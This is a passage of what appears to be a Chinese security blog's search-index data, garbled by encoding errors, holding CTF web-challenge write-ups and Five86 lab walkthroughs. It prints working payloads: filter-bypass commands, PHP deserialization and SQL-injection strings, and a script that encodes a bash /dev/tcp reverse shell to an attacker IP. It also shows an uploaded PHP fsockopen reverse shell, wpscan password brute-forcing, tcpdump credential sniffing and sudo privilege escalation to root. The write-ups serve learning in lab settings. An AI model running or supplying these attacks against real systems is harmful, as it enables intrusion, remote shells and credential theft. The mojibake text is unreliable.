a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 è¿™é‡Œè¿‡æ»¤äº†å¤§éƒ¨åˆ†å‘½ä»¤æ‰§è¡Œçš„è¯­å¥ if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\`|;|,|\\*|\\?|\\ è¿™é‡Œæƒ³åˆ° linuxå‘½ä»¤ä¸­å¯ä»¥åŠ \\ï¼Œæ‰€ä»¥ç”šè‡³å¯ä»¥ca\\t /fl\\ag æŸ¥çœ‹å½“å‰ç›®å½•æœ‰æ²¡æœ‰flag: å¹¶æ²¡æœ‰ã€‚ã€‚ å»æ ¹ç›®å½•ä¸‹æ‰¾flagï¼š å‘ç°flagï¼Œè¯»å–ï¼š ç¦ç”¨catä¹‹åï¼Œcmd=/bin/c\\at%20/flag çœ‹ç½‘ä¸Šè¿˜æœ‰ä¸€ç§æ–¹æ³•è¯»å–flagï¼š sortå‘½ä»¤ï¼šsortå°†æ–‡ä»¶çš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªå•ä½ï¼Œç›¸äº’æ¯”è¾ƒï¼Œæ¯”è¾ƒåŸåˆ™æ˜¯ä»é¦–å­—ç¬¦å‘åï¼Œä¾æ¬¡æŒ‰ASCIIç å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæœ€åå°†ä»–ä»¬æŒ‰å‡åºè¾“å‡ºã€‚ a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 â€‹ å¾—åˆ°flag ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ å…ˆè¯•äº†ä¸‹æ–‡ä»¶ä¸Šä¼ ,å‘ç°å¥½åƒçœŸçš„æ²¡æœ‰é—®é¢˜, ç„¶ååœ¨index.htmlæœ€ä¸‹æ–¹æœ‰æç¤ºï¼Œå¯ä»¥åœ¨githubä¸Šä¸‹è½½æºç è¿›è¡Œå®¡è®¡ã€‚ åœ¨helper.phpä¸­å­˜åœ¨è¯»å–æ–‡ä»¶å†…å®¹å‡½æ•°ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨destructå‡½æ•°è‡ªåŠ¨è§¦å‘ã€‚ public function view_files($path){ if ($this-&gt;ifview == False){ return False; //The function is not yet perfect, it is not open yet. } $content = file_get_contents($path); echo $content; } function __destruct(){ # Read some config html $this-&gt;view_files($this-&gt;config); } å¦‚æœå¯ä»¥æ„é€ å¦‚ä¸‹çš„ç±»å¹¶å°†åºåˆ—åŒ–å­—ç¬¦ä¸²ä¼ å…¥ï¼Œå°±å¯ä»¥è¯»å–åˆ°flag &lt;?php class helper { protected $ifview = True; protected $config = &quot;&quot;; public function __construct() { $this-&gt;config = &quot;flag&quot;; } } $a = new helper(); $b = serialize($a); var_dump($b); ?&gt; åœ¨show.phpä¸­å­˜åœ¨ååºåˆ—åŒ–å‡½æ•°ï¼Œè·Ÿéšå˜é‡attr_tempï¼Œçœ‹åˆ°æ­¤å˜é‡æ¥æºäºæ•°æ®åº“ä¸­attråˆ—ã€‚ public function Get_All_Images(){ $sql = &quot;SELECT * FROM images&quot;; $result = mysqli_query($this-&gt;con, $sql); if ($result-&gt;num_rows &gt; 0){ while($row = $result-&gt;fetch_assoc()){ if($row[&quot;attr&quot;]){ $attr_temp = str_replace(&#39;\\0\\0\\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]); $attr = unserialize($attr_temp); } echo &quot;&lt;p&gt;id=&quot;.$row[&quot;id&quot;].&quot; filename=&quot;.$row[&quot;filename&quot;].&quot; path=&quot;.$row[&quot;path&quot;].&quot;&lt;/p&gt;&quot;; } }else{ echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;; } mysqli_close($this-&gt;con); } åœ¨helper.phpä¸­çš„uploadå‡½æ•°ä¸­æˆ‘ä»¬å¾—çŸ¥æ•°æ®åº“ä¸€å…±æœ‰titleï¼Œfilenameï¼Œextï¼Œpathï¼Œatträº”åˆ—ï¼Œå…¶ä¸­attråˆ—å†…å®¹æ¥æºäºä¸Šä¼ å›¾åƒçš„é•¿å®½åºåˆ—åŒ–æ•°ç»„ï¼Œå¾ˆéš¾è¿›è¡Œæ§åˆ¶ã€‚ $array[&quot;title&quot;] = $fileinfo[&#39;title&#39;]; $array[&quot;filename&quot;] = $fileinfo[&#39;filename&#39;]; $array[&quot;ext&quot;] = $fileinfo[&#39;ext&#39;]; $array[&quot;path&quot;] = $fileinfo[&#39;path&#39;]; $img_ext = getimagesize($_FILES[$input][&quot;tmp_name&quot;]); $my_ext = array(&quot;width&quot;=&gt;$img_ext[0],&quot;height&quot;=&gt;$img_ext[1]); $array[&quot;attr&quot;] = serialize($my_ext); æŸ¥çœ‹helper.phpä¸­çš„æ•°æ®åº“æ“ä½œå‡½æ•°ï¼Œå¯¹è¾“å…¥æ•°æ®åº“çš„æ•°æ®æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ã€‚ foreach($data as $key=&gt;$value){ $key_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $key); $value_temp = str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\\0\\0\\0&#39;, $value); $sql_fields[] = &quot;`&quot;.$key_temp.&quot;`&quot;; $sql_val[] = &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;; } $sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;; mysqli_query($con, $sql); å›æƒ³å‰é¢çš„5åˆ—ä¸­ï¼Œæˆ‘ä»¬å¯æ§çš„ä¸”æ²¡æœ‰è¿‡æ»¤çš„æ˜¯filenameåˆ—ä¹Ÿå°±æ˜¯æ–‡ä»¶åï¼Œå¯ä»¥æ„é€ æ–‡ä»¶åä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå‡ºå‘unserializeå‡½æ•°ï¼Œè¯»å–ä»»æ„æ–‡ä»¶ã€‚ title_value&#39;,&#39;filename_value&#39;,&#39;ext_value&#39;,&#39;path_value&#39;,&#39;O:6:&quot;helper&quot;:2:{s:9:&quot;*ifview&quot;;b:1;s:9:&quot;*config&quot;;s:4:&quot;flag&quot;;}#php éš¾é¢˜æ˜¯åœ¨åºåˆ—åŒ–ä¸­ï¼Œæ‰€æœ‰çš„privateå’Œprotectedå˜é‡åºåˆ—åŒ–ä¹‹åéƒ½ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ã€‚å°†åºåˆ—åŒ–çš„å†…å®¹è¾“å‡ºï¼Œä½¿ç”¨Hex Fiendæ‰“å¼€ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æ˜Ÿå·*ä¸¤ä¾§æ˜¯å­˜åœ¨ä¸å¯è§å­—ç¬¦00çš„ã€‚ç›´æ¥å¤åˆ¶è¾“å‡ºçš„è¯æ˜¯æ— æ³•ä¼ å…¥è¿™ä¸¤ä¸ªå­—ç¬¦çš„ã€‚åœ¨å‰é¢æ•°æ®åº“æ’å…¥æ“ä½œçš„æ—¶å€™ï¼Œå°†00*00è½¬æ¢ä¸º\\0\\0\\0äº†ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰åˆè½¬æ¢äº†å›æ¥ã€‚ ç”±äºä¸Šä¼ æ—¶æ–‡ä»¶åä¸å…è®¸å‡ºç°å¼•å·ï¼Œé…åˆæ•°æ®åº“å°†0xå¼€å¤´çš„å­—ç¬¦ä¸²é»˜è®¤ä¸º16è¿›åˆ¶çš„ç‰¹ç‚¹ï¼Œæœ€ç»ˆpayloadä¸º 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#.jpg å°†å®é™…æ’å…¥æ•°æ®åº“çš„è¯­å¥æ”¹å†™ä¸ºï¼Œå®Œæˆæ³¨å…¥ï¼Œååºåˆ—åŒ–è¯»å–æ•°æ®åº“ä¸­çš„æ¶æ„ä»£ç ï¼Œè®¿é—®show.php,å®Œæˆæ–‡ä»¶è¯»å–ã€‚ INSERT INTO images(&#39;title&#39;,&#39;filename&#39;,&#39;ext&#39;,&#39;path&#39;,&#39;attr&#39;) VALUES (&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4F3A363A2268656C706572223A323A7B733A393A22002A00696676696577223B623A313B733A393A22002A00636F6E666967223B733A353A222F666C6167223B7D)#) easy_serialize_phpé¦–å…ˆè¿›å»å°±å¯ä»¥çœ‹åˆ°æºç  &lt;?php $function = @$_GET[&#39;f&#39;]; function filter($img){ $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;; return preg_replace($filter,&#39;&#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[&quot;user&quot;] = &#39;guest&#39;; $_SESSION[&#39;function&#39;] = $function; extract($_POST); //extractå˜é‡è¦†ç›– if(!$function){ echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;; } if(!$_GET[&#39;img_path&#39;]){ $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;); }else{ $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;])); //sha1åŠ å¯† } $serialize_info = filter(serialize($_SESSION)); if($function == &#39;highlight_file&#39;){ highlight_file(&#39;index.php&#39;); }else if($function == &#39;phpinfo&#39;){ eval(&#39;phpinfo();&#39;); //maybe you can find something in here! }else if($function == &#39;show_image&#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); } çŸ¥è¯†ç‚¹ extractå˜é‡è¦†ç›– ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ è§£é¢˜é¦–å…ˆæŸ¥çœ‹phpinfoå‘ç°php.iniä¸­è®¾ç½®äº†auto_prepend_fileéšå¼åŒ…å«äº†d0g3_f1ag.php,æœ¬é¢˜å°±æ˜¯è¦è¯»å–è¯¥æ–‡ä»¶ 0x01 extractå˜é‡è¦†ç›–extract()å‡½æ•° è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„çš„é”®å€¼ä½œä¸ºå˜é‡å€¼ å…¶å®æœ¬æ˜¯çŸ¥é“è¿™ä¸ªçŸ¥è¯†ç‚¹çš„,ä½†æ˜¯ç†è§£ä¸å¤Ÿæ·±å…¥,å¯¼è‡´è‡ªå·±ä¸€ç›´æ²¡æœ‰åˆ©ç”¨åˆ°è¯¥çŸ¥è¯†ç‚¹ å½“æˆ‘ä»¬$_GETä¼ å…¥çš„æ˜¯_session[img]=â€œindex.phpâ€æ—¶,ç»è¿‡äº†extractå‡½æ•°åä¼šäº§ç”Ÿ$_session[img]=index.php è¿™é‡Œåˆ†æä»£ç  å…ˆæ˜¯èµ‹å€¼: $_SESSION[â€œuserâ€] = â€˜guestâ€™;$_SESSION[â€˜functionâ€™] = $function; //è‹¥æƒ³è¦æ˜¾ç¤ºæºç ,$f=â€™show_imageâ€™; $_SESSION[â€˜imgâ€™]ä¹Ÿåªèƒ½ç­‰äºbase64_encode(â€˜guest_img.pngâ€™);å› ä¸ºè‹¥æˆ‘ä»¬ä¼ å…¥å‚æ•°img_PATHçš„è¯imgçš„å€¼ä¼šè¿›è¡Œsha1åŠ å¯†,è€Œåé¢æ˜¯æ²¡æœ‰è§£å¯†çš„ å¯çŸ¥ä¸‰ä¸ªå˜é‡éƒ½æ˜¯æˆ‘ä»¬ä¸èƒ½æ§åˆ¶çš„,è¿™é‡Œå°±èƒ½å¤Ÿæœ‰å¾ˆå¤šç§è§£äº†,é€šè¿‡extract()è¿›è¡Œå˜é‡è¦†ç›– 0x02 ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸_sessionå¯æ§å,å°±å¯ä»¥æœ‰å¾ˆå¤šç§è§£æ³•äº†,è¿™é‡Œæä¾›ä¸¤ç§è§£æ³•: å€¼é€ƒé€¸payload1:_SESSION[user]=flagflagflagflagflagflagflagphp&amp;_SESSION[function]=function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}ä¼ å…¥çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–å: a:3;{s:4:&quot;user&quot;;s:31:&quot;flagflagflagflagflagflagflagphp&quot;; s:8:&quot;function&quot;;s:82:&quot;function&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} ç»è¿‡è¿‡æ»¤å‡½æ•°å: a:3;{s:4:&quot;user&quot;;s:31:&quot;&quot;;s:8:&quot;function&quot;;s:82:&quot;function&quot;; s:8:&quot;function&quot;;s:10:&quot;show_image&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} é”®é€ƒé€¸payload2:_SESSION[flagphp]=;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} ä¼ å…¥çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–å: a:2:{s:7:&quot;flagphp&quot;; s:48:&quot;;s:1:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;; s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} ç»è¿‡è¿‡æ»¤å‡½æ•°å: a:2:{s:7:&quot;&quot;;s:48:&quot;; s:1:&quot;a&quot;; s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot; //;&quot;s:3:&quot;img&quot;;s:x:&quot;base64&quot;;} è¿˜æœ‰å°±æ˜¯å†™payloadæœ€å¥½åœ¨æœ¬åœ°å†™,ç„¶åçœ‹å®ƒååºåˆ—åŒ–åçš„æ ·å­åœ¨æ›´æ”¹,ä¸ç„¶æœ‰äº›å°æ¯›ç—…è‡ªå·±å‘ç°ä¸äº†(ç°åœ¨èƒ½åŠ›å¤ªå·®äº†) ç„¶åç»§ç»­è¯»å°±å¯ä»¥äº† [å®‰æ´µæ¯ 2020]Web-Bash-Vino0o0oé¢˜ç›®ä»£ç  &lt;?php highlight_file(__FILE__); if(isset($_POST[&quot;cmd&quot;])) { $test = $_POST[&#39;cmd&#39;]; $white_list = str_split(&#39;$&quot;; #01 n[2]=&quot;$(($&lt;&lt;$))&quot; #10 n[3]=&quot;$(($(($&lt;&lt;$))|$))&quot; #11 n[4]=&quot;$(($(($&lt;&lt;$))&lt;&lt;$))&quot; #100 n[5]=&quot;$(($(($(($&lt;&lt;$))&lt;&lt;$))|$))&quot; #101 n[6]=&quot;$(($(($(($&lt;&lt;$))&lt;&lt;$))|$(($&lt;&lt;$))))&quot; #101 n[7]=&quot;$(($(($(($(($&lt;&lt;$))&lt;&lt;$))|$))|$(($&lt;&lt;$))))&quot; #111 ç„¶åå‘ç°é”™äº†,å› ä¸ºä¸èƒ½åŒ…å« | n = dict() n[0] = &#39;0&#39; n[1] = &#39;$&#39; #$è®¡ç®—#è¿™ä¸ªå­—ç¬¦çš„é•¿åº¦ä¸º1ï¼Œè¿™é‡Œå¦‚æœæ²¡æœ‰å±è”½!çš„è¯è¿˜å¯ä»¥ç”¨$((!$#)) n[2] = &#39;$(($&lt;&lt;$))&#39; #é€šè¿‡ä½è¿ç®—å¾—åˆ°2 n[3] = &#39;$(($(($&lt;&lt;$))#$$))&#39; #é€šè¿‡äºŒè¿›åˆ¶11è½¬æ¢ä¸ºåè¿›åˆ¶å¾—åˆ°3,4,5,6,7 n[4] = &#39;$(($&lt;&lt;$(($&lt;&lt;$))))&#39; n[5] = &#39;$(($(($&lt;&lt;$))#$0$))&#39; n[6] = &#39;$(($(($&lt;&lt;$))#$$0))&#39; n[7] = &#39;$(($(($&lt;&lt;$))#$$$))&#39; â€‹ 3.è½¬æ¢æˆæ•°å­—ä¹‹åå°±éœ€è¦ç”¨åˆ°&lt;&lt;&lt;æ¥é‡å®šå‘äº†ï¼Œä½†æ˜¯ä¸€å±‚ä¸å¤Ÿï¼Œåªç”¨ä¸€å±‚ä¼šå‡ºç°bash: $&#39;\\154\\163&#39;: command not foundè¿™æ ·çš„æŠ¥é”™ï¼Œå¾—çŸ¥bashä¸€æ¬¡è§£æåªèƒ½è§£æåˆ°æˆæ•°å­—ï¼Œéœ€è¦ç¬¬äºŒæ¬¡è§£æã€‚å› æ­¤éœ€è¦ç»™åŸå…ˆçš„å‘½ä»¤æ·»åŠ è½¬ä¹‰å­—ç¬¦ï¼Œæœ€ç»ˆæ„é€ å‡ºå¦‚ä¸‹payload:$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#39;\\\\$$(($(($&lt;&lt;$))#$0$))$(($&lt;&lt;$(($&lt;&lt;$))))\\\\$$(($(($&lt;&lt;$))#$$0))$(($(($&lt;&lt;$))#$$))\\\\$(($&lt;&lt;$(($&lt;&lt;$))))0\\\\$(($(($&lt;&lt;$))#$0$))$(($(($&lt;&lt;$))#$$$))\\&#39;æ‰§è¡Œlså‘½ä»¤ è„šæœ¬ import requests n = dict() n[0] = &#39;0&#39; n[1] = &#39;$&#39; #$è®¡ç®—#è¿™ä¸ªå­—ç¬¦çš„é•¿åº¦ä¸º1ï¼Œè¿™é‡Œå¦‚æœæ²¡æœ‰å±è”½!çš„è¯è¿˜å¯ä»¥ç”¨$((!$#)) n[2] = &#39;$(($&lt;&lt;$))&#39; #é€šè¿‡ä½è¿ç®—å¾—åˆ°2 n[3] = &#39;$(($(($&lt;&lt;$))#$$))&#39; #é€šè¿‡äºŒè¿›åˆ¶11è½¬æ¢ä¸ºåè¿›åˆ¶å¾—åˆ°3,4,5,6,7 n[4] = &#39;$(($&lt;&lt;$(($&lt;&lt;$))))&#39; n[5] = &#39;$(($(($&lt;&lt;$))#$0$))&#39; n[6] = &#39;$(($(($&lt;&lt;$))#$$0))&#39; n[7] = &#39;$(($(($&lt;&lt;$))#$$$))&#39; cmd=&quot;bash -i &gt;&amp; /dev/tcp/192.168.182.137/2333 0&gt;&amp;1&quot;; def str_to_oct(cmd): # å‘½ä»¤è½¬æ¢æˆå…«è¿›åˆ¶å­—ç¬¦ä¸² s = &quot;&quot; for t in cmd: o = (&#39;%s&#39; % (oct(ord(t))))[2:] s += &#39;\\\\&#39; + o return s def build(cmd): # å…«è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢æˆå­—ç¬¦ payload = &quot;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\\\\&#39;&quot; s = str_to_oct(cmd).split(&#39;\\\\&#39;) for _ in s[1:]: payload += &quot;\\\\\\\\&quot; for i in _: payload += n[int(i)] return payload + &#39;\\\\\\&#39;&#39; print(build(cmd))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]},{"title":"Five86-2","slug":"Five86-2","date":"2021-02-19T11:40:09.000Z","updated":"2021-02-24T15:32:36.838Z","comments":false,"path":"2021/02/19/Five86-2/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/19/Five86-2/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.152 è®¿é—®80ç«¯å£,å‘ç°å‡ºäº†ä¸€ç‚¹å°é—®é¢˜ï¼Œåœ¨hostsæ–‡ä»¶ä¸­åŠ å…¥ 192.168.182.152 five86-2 è¿™æ ·å°±å¥½äº†,åœ¨searchsploitå’ŒGoogleå¹¶æ²¡æœ‰å‘ç°WordPress 5.1.4çš„æ¼æ´ï¼Œè¿˜æ˜¯å…ˆè®¿é—®ä¸€ä¸‹åå° åå°ç™»å½•wpscanæ‰«æå…ˆç”¨wpscanæ‰«æä¸€ä¸‹ç”¨æˆ·å wpscan â€“url http://192.168.182.152 -e u å°†ç”¨æˆ·åä¿å­˜åˆ°user.txtæ–‡ä»¶ä¸­ cewlæ‰«å¯†ç cewl http://five86-2/ -w pass.txt æš´åŠ›ç ´è§£ wpscan --url http://192.168.182.152 -U user.txt -P pass.txt æ²¡è·‘å‡ºæ¥ wpscan --url http://192.168.182.152-U user.txt -P /usr/share/wordlists/rockyou.txt çˆ†ç ´å‡ºä¸¤ä¸ªç”¨æˆ·çš„å¯†ç  [SUCCESS] - barney / spooky1 [SUCCESS] - stephen / apollo1 Getshellæ’ä»¶æ¼æ´ä½¿ç”¨darneyç”¨æˆ·ç™»å½•ä¸€ä¸‹çœ‹çœ‹,å‘ç°barneyç”¨æˆ·å¯ä»¥åŠ è½½æ’ä»¶ï¼Œç„¶åå¯ä»¥å»æœç´¢æ’ä»¶çš„æ¼æ´ï¼Œåˆ©ç”¨æ’ä»¶ææƒã€‚ å®‰ç€è¯´æ˜ä¸Šçš„åš,æˆåŠŸä¸Šä¼ æœ¨é©¬ å‡†å¤‡ç”¨èšå‰‘è¿æ¥åå¼¹ä¸€ä¸ªshell,ä½†æ˜¯èšå‰‘æ€ä¹ˆéƒ½è¿ä¸èµ·,å°±åœ¨pocæ–‡ä»¶é‡ŒåˆåŠ äº†ä¸€ä¸ªnc.php xxx&lt;?php $sock=fsockopen(&quot;192.168.182.137&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ç„¶ååœ¨index.phpä¸­?cmd=php nc.php æˆåŠŸåå¼¹shell ç„¶åä½¿ç”¨pythonè¿›å…¥äº¤äº’æ¨¡å¼ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; ææƒææƒpaultcpdumpçš„æŠ“åŒ…ä»¥åŠæµé‡åˆ†æå»homeç›®å½•ä¸‹å‘ç°éƒ½è¿›ä¸å»ï¼Œæ‰“ç®—suåˆ°å…¶ä»–ç”¨æˆ·ï¼Œå°è¯•åˆšæ‰çˆ†ç ´å‡ºæ¥çš„ä¸¤ä¸ªç”¨æˆ·ï¼Œbarneyç”¨æˆ·å¯†ç ä¸å¯¹,å°è¯•stephenç”¨æˆ·ï¼ŒæˆåŠŸç™»é™†åˆ°stephenç”¨æˆ· ä½†æ˜¯æ‰¾äº†åŠå¤©éƒ½æ²¡æœ‰å‘ç°ææƒçš„æ–¹æ³• å‘ç°ç”¨æˆ·åœ¨pcapç”¨æˆ·ç»„é‡Œé¢ æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿè¿›ç¨‹ï¼š ps -auxwww å‘ç°ç³»ç»Ÿè¿è¡Œftpï¼Œç”±äºftpä¼ è¾“æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œè¿™æ˜¯æ—¶å€™æƒ³åˆ°ç›‘å¬ç³»ç»Ÿç½‘å¡ï¼Œåˆ†ææµé‡ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ•æ‰åˆ°ftpçš„è´¦å·å¯†ç ã€‚å¯åŠ¨ftpçš„æ˜¯â€œpaulâ€å¸å·ï¼Œä½¿ç”¨â€œstephenâ€å¸å·é€šè¿‡tcpdumpè·å–æµé‡ï¼Œå¹¶ä¸‹è½½è‡³æœ¬åœ°åˆ†æã€‚ tcpdump -D æ³¨é‡Šï¼š-D æ‰“å°å‡ºç³»ç»Ÿä¸­æ‰€æœ‰å¯ä»¥ç”¨tcpdumpæˆªåŒ…çš„ç½‘ç»œæ¥å£ã€‚ timeout 120 tcpdump -w hack.pcap -i vethbe01e05 æ³¨é‡Šï¼š timeout 120ï¼Œæ˜¯ç”¨æ¥æ§åˆ¶ tcpdump çš„è¶…æ—¶æ—¶é—´ä¸º 120s tcpdump -w ä¿å­˜ä¸º saul.pcapï¼Œ-i çš„æ„æ€æ˜¯æŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ æœ€åè¯»å–åˆšåˆšè·å–çš„æ•°æ®åŒ…å‘ç°ä¸€ä¸ª FTP è´¦å·å¯†ç ï¼š tcpdump -r hack.pcap PASS esomepasswford åˆ‡æ¢åˆ°paulç”¨æˆ· ææƒpetersudo -lç°å¯ä»¥ä½¿ç”¨peterç”¨æˆ·çš„serviceç¨‹åº æ¥ç€æˆ‘ä½¿ç”¨ sudo æ¥ä»¥ peter ç”¨æˆ·å»è¿è¡Œ /usr/sbin/service ï¼Œå¹¶åˆ‡æ¢åˆ° /bin/bash ï¼Œè¿™ä¸ªæ—¶å€™å°±æˆåŠŸåˆ‡æ¢åˆ° peter ç”¨æˆ·ï¼š sudo -u peter /usr/sbin/service ../../bin/bash æˆåŠŸè·å¾—peterç”¨æˆ·çš„shell,è¿˜æ˜¯sudo -lä¸€ä¸‹,å‘ç° ææƒrootç›´æ¥æ”¹rootç”¨æˆ·å¯†ç  sudo -u root passwd root","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://pp1ove.gitee.io/tags/æ¸—é€/"}],"keywords":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://pp1ove.gitee.io/categories/é¶æœº/"}]},{"title":"Five86-1","slug":"Five86-1","date":"2021-02-19T02:27:51.000Z","updated":"2021-02-24T15:32:34.819Z","comments":false,"path":"2021/02/19/Five86-1/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/19/Five86-1/","excerpt":"","text":"ä¿¡æ¯æœé›†ä¸»æœºå‘ç°nmap -sn 192.168.182.0/24 nmap -sS 192.168.182.151 è®¿é—®ä¸€ä¸‹80ç«¯å£ æ‰«ä¸€ä¸‹ å‘ç°robotsæ–‡ä»¶ ç¦æ­¢çˆ¬è™«è®¿é—®/onaç›®å½• æ¼æ´å‘ç°æˆ‘ä»¬æ‰‹åŠ¨è®¿é—®ä¸€ä¸‹ï¼Œå‘ç°: å‘ç°äº†ç³»ç»Ÿå’Œç‰ˆæœ¬,æ˜¯ä¸€ä¸ªOpenNetAdmin v18.1.1ç³»ç»Ÿ å»æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰ç›¸å…³æ¼æ´ å‘ç°ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ Getshellåœ¨æ‰§è¡Œæ—¶æŠ¥é”™äº†,ç™¾åº¦ä¸€ä¸‹å‘ç°éœ€è¦è½¬æ¢æ ¼å¼ æ‰§è¡Œbash ./19.sh http://192.168.182.151/ona/ æˆåŠŸæ‹¿åˆ°shell,ï¼ˆæˆ‘è¿™é‡Œæ²¡æœ‰åŠ æœ€åçš„/ç»“æœä¸€ç›´æ²¡æœ‰æˆåŠŸï¼‰ ç»è¿‡ä¸€ç•ªæµ‹è¯•ï¼Œå‘ç°è¿™é‡Œæ— æ³•æ‰§è¡Œçš„å‘½ä»¤æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œå¹¶ä¸”ä¸èƒ½æ‰§è¡Œcdå‘½ä»¤ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨lså’Œcatå‘½ä»¤ ææƒææƒdouglasæ‰§è¡Œfindå‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥è¯»å–çš„æ–‡ä»¶ find / -type f -user www-data å‘ç° /var/www/html/reports/.htaccess /var/log/ona.log è¯»å–var/www/html/reports/.htaccesså¯ä»¥æ‰¾åˆ°AuthUserFileçš„è·¯å¾„/var/www/.htpasswd htpasswdå»ºç«‹å’Œæ›´æ–°å­˜å‚¨ç”¨æˆ·åã€å¯†ç 